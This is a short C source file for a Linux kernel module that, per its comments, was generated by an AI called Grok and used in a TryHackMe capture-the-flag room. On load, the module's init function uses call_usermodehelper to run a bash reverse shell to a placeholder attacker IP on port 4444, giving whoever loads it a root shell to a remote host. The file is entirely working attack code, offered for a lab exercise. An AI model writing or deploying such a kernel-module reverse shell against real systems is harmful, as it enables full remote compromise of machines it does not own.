// Script by Grok AI
// used on tryhackme room Avengers Hub https://tryhackme.com/room/HackfinityBattleEncore
// YouTube video link: https://youtu.be/XWBN_T3v0zY

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

static int __init cyberavengers_init(void) {
    char *argv[] = {"/bin/bash", "-c", "bash -i >& /dev/tcp/YOUR_ATTACKER_IP/4444 0>&1", NULL};
    char *envp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit cyberavengers_exit(void) {
    printk(KERN_INFO "CyberAvengers: Module unloaded\n");
}

module_init(cyberavengers_init);
module_exit(cyberavengers_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("CyberAvengers");
